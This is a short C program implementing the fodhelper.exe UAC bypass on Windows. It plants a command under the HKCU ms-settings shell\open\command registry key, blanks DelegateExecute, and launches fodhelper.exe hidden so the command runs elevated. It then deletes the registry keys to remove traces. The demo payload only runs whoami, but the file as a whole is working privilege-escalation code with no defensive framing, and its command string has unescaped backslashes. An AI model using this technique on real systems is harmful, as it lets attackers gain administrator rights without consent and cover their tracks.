
#include <windows.h>
#include <stdio.h>

int main() {
    const char* cmd = "cmd.exe /c whoami > C:\ProgramData\uac_test.txt";
    const char* reg_path = "Software\\Classes\\ms-settings\\shell\\open\\command";
    const char* delegate = "Software\\Classes\\ms-settings\\shell\\open\\command";

    /* Write command to HKCU registry */
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, reg_path,
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)cmd, (DWORD)strlen(cmd)+1);

    /* Set DelegateExecute to empty string */
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
        (BYTE*)"", 1);

    RegCloseKey(hKey);

    /* Launch fodhelper - auto-elevates and runs our command */
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(
        "C:\\Windows\\System32\\fodhelper.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    /* Wait for fodhelper to complete */
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Cleanup registry */
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings");

    return 0;
}
